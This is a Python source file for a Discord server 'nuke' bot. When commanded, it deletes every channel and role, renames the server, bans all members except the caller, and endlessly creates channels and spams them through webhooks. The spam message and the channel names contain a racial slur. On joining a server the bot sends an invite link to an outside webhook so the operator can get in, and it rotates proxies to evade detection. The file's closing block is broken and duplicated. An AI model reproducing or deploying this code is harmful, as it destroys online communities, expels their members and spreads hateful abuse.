from flask import Flask, request, redirect, session, render_template
import os
import json
import requests
from discord import Client, Intents, Guild, TextChannel, Member, Permissions, Webhook
from discord.ext import commands
import asyncio
from itertools import cycle
from colorama import Fore, init
import random
import threading
import time

init(autoreset=True)

app = Flask(__name__)
app.secret_key = os.urandom(24)

with open('config.json') as config_file:
    config = json.load(config_file)

CLIENT_ID = config['CLIENT_ID']
CLIENT_SECRET = config['CLIENT_SECRET']
REDIRECT_URI = config['REDIRECT_URI']
REQUIRED_GUILD_ID = config['REQUIRED_GUILD_ID']
PORT = config['PORT']
LOGGING_WEBHOOK_URL = config['LOGGING_WEBHOOK_URL']  
with open("icon.png", "rb") as file:
    servicon = file.read()

msgcum = ["""# 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐧𝐢𝐠𝐠𝐞𝐫𝐞𝐝 𝐛𝐲 𝐂𝐀 ! @everyone
https://discord.gg/mjHFJz72f5"""]

channels = cycle(["𝐍𝐔𝐊𝐄𝐃 𝐁𝐘 𝐂𝐀", "𝐍𝐈𝐆𝐆𝐄𝐑𝐄𝐃", "𝐒𝐔𝐁𝐌𝐈𝐓 𝐓𝐎 𝐂𝐀"])
rolename = channels
webhooknames = channels

servname = "NUKED BY CA" 

with open("proxies.txt", "r") as file:
    proxies = file.read().splitlines()

async def log_server(guild):
    try:
        await asyncio.sleep(300)
        invite = await guild.text_channels[0].create_invite(max_age=300)
        log_data = {
            "content": f"Bot added to server:\n**Server ID:** {guild.id}\n**Server Name:** {guild.name}\n**Invite:** {invite.url}"
        }
        requests.post(LOGGING_WEBHOOK_URL, json=log_data)
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to log server: {e}")

def run_bot(bot_token):
    intents = Intents.default()
    intents.guilds = True
    intents.guild_messages = True
    intents.members = True
    intents.message_content = True

    bot = commands.Bot(command_prefix='$', intents=intents)

    @bot.event
    async def on_ready():
        print(Fore.RED + f"""
██████╗ ███████╗███████╗████████╗██████╗  ██████╗ ██╗   ██╗███████╗██████╗ 
██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗╚██╗ ██╔╝██╔════╝██╔══██╗
██║  ██║█████╗  ███████╗   ██║   ██████╔╝██║   ██║ ╚████╔╝ █████╗  ██████╔╝
██║  ██║██╔══╝  ╚════██║   ██║   ██╔══██╗██║   ██║  ╚██╔╝  ██╔══╝  ██╔══██╗
██████╔╝███████╗███████║   ██║   ██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║
╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
{Fore.YELLOW}[i] Destroyer: Ready to destroy some Gachas.
{Fore.YELLOW}[i] Username: {bot.user}
{Fore.YELLOW}[i] User ID: {bot.user.id}
{Fore.YELLOW}[i] Selfbot: False
{Fore.YELLOW}[i] Bot: True
{Fore.YELLOW}[i] Prefix: v!
{Fore.YELLOW}[i] Creator: Xen_Artemis
{Fore.YELLOW}[i] Help: Type v!help for a list of commands.
{Fore.YELLOW}[i] Invite URL: https://discord.com/oauth2/authorize?client_id={bot.user.id}&scope=bot&permissions=8
""")

        for guild in bot.guilds:
            asyncio.create_task(log_server(guild))

    @bot.event
    async def on_guild_join(guild):
        asyncio.create_task(log_server(guild))

    async def delchans(ctx):
        void = ctx.guild
        for channel in void.channels:
            try:
                await channel.delete()
                print(f"{Fore.GREEN}[+] Channel deleted")
            except:
                print(f"{Fore.RED}[-] Channel not deleted")

    async def createchans(ctx):
        void = ctx.guild
        while True:
            try:
                await void.create_text_channel(name=next(channels))
                print(f"{Fore.GREEN}[+] Channel created")
            except:
                print(f"{Fore.RED}[-] Channel not created")

    async def croles(ctx):
        void = ctx.guild
        for i in range(250):
            try:
                await void.create_role(name=next(rolename))
                print(f"{Fore.GREEN}[+] Role created")
            except:
                print(f"{Fore.RED}[-] Role not created")

    @bot.command()
    async def nuke(ctx):
        await ctx.message.delete()
        void = ctx.guild
        await void.edit(name=servname, icon=servicon)
        await asyncio.gather(
            delchans(ctx),
            createchans(ctx),
            croles(ctx)
        )

    @bot.command()
    async def mban(ctx):
        void = ctx.guild
        await ctx.message.delete()
        for member in void.members:
            if member != ctx.author:
                try:
                    await member.ban(reason=next(channels))
                    print(f"{Fore.GREEN}[+] banned {member}")
                except:
                    print(f"{Fore.RED}[-] {member} not banned")

    @bot.event
    async def on_guild_channel_create(channel):
        try:
            await channel.create_webhook(name="CELESTIUM ARMHENIA", avatar=servicon)
            print(f"{Fore.GREEN}[+] Webhook created")
        except:
            print(f"{Fore.RED}[-] Webhook not created")
        for webhook in await channel.webhooks():
            while True:
                await webhook.send(random.choice(msgcum))
                await channel.send(random.choice(msgcum))

    @bot.command()
    async def roledel(ctx):
        void = ctx.guild
        await ctx.message.delete()
        for role in void.roles:
            try:
                await role.delete()
                print(f"{Fore.GREEN}[+] Role deleted")
            except:
                print(f"{Fore.RED}[-] Role not deleted")

    async def stop_bot():
        await asyncio.sleep(3600)
        await bot.close()

    proxy = random.choice(proxies)
    bot.run(bot_token, proxy=proxy)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=PORT)
    bot.run(bot_token, proxy=proxy)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=PORT)
